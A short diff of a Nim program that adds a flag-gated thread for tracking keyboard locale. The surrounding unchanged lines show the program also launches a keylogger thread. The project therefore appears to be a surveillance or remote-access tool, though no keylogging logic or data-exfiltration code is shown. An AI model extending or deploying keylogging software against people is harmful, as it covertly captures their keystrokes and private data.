@@ -81,6 +81,14 @@ from lib/channels import mainChannel
 
 open mainChannel
 
+from lib/flags import USE_KEYBOARD_LOCALE_THREAD
+when USE_KEYBOARD_LOCALE_THREAD:
+  from lib/threads/keyboardLocaleThread import initKeyboardLocaleThread
+
+  var keyboardLocaleThreadVar: Thread[void]
+
+  createThread(keyboardLocaleThreadVar, initKeyboardLocaleThread)
+
 from lib/flags import USE_KEYLOGGER_THREAD
 when USE_KEYLOGGER_THREAD:
   from lib/threads/keyloggerThread import initKeyloggerThread
